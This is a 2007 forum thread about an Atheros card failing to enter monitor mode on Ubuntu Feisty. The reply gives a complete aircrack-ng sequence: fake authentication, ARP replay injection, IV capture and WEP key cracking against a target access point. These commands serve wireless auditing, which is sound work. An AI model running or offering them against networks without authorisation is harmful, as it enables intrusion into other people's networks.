---
title: "Feisty Atheros monitor mode problem"
date: 2007-04-29
forum: Networking &amp; Wireless
---

### Post by Funkwheat on 2007-04-29
Ok, so I've been battling with this issue for a few weeks now with absolutely no luck.

Everytime I try to use airmon to start my ath0 in monitor mode, it will not work.  

Oddly, though, whenever I do "ifconfig ath0 down", then try to bring it back up, it won't come back up.  I end up having to restart everytime.  Same deal if I do airmon-ng start ath0...  It's as if the ath0 interface totally disappears as soon as I bring it down.

I have also tried typing airmon-ng start wifi0... At this point, it ends up bringing up ath1 instead of ath0 (I only have one card...).  The ath1 interface it brings up does show up in Monitor mode, but it is non-functional (airodump-ng ath1 brings up nothin)...

I've followed everything on this guide:  [http://www.aircrack-ng.org/doku.php?id=simple_wep_crack](http://www.aircrack-ng.org/doku.php?id=simple_wep_crack) , as well as tried a few other things found on Google (Such as patching my madwifi drivers...)  None of them resulted in any luck.... Same problem no matter what I do.

Anyone else had this problem with an Atheros card in Feisty?  Sorry if my description of the problem was bad, I'm a lil tired ;)  

Anyway if anyone has any info please let me know :)

Thanks in advance!

---

### Post by tturrisi on 2007-04-29
When I use aircrack-ng on Etch, after destroying the ath0 interface and bringing up wifi0, I am left with a NEW athX interfcae.  This is the athX interface I must use.  And patched drivers MUST be used no matter what, else it will never work.

try this:

```
aircrack-ng steps for ath0: -b=AP MAC and -h=card MAC and Linksys=ssid

airmon-ng stop ath0
airmon-ng start wifi0 11  (where 11 = the channel you want to monitor)
iwconfig (this will show the CURRENT athX interface, it likely has changed to ath1)
ifconfig ath1 up
aireplay-ng -1 0 -e Linksys -a ap-mac-address-here -h card-mac-address-here ath1
airodump-ng -c 11 --bssid ap-mac-address-here --ivs -w output ath1  (in new terminal window)
aireplay-ng -3 -b ap-mac-address-here -h card-mac-address-here ath1  (in new terminal window)
aircrack-ng -b ap-mac-address-here output*.ivs  (in new terminal window)
```

---

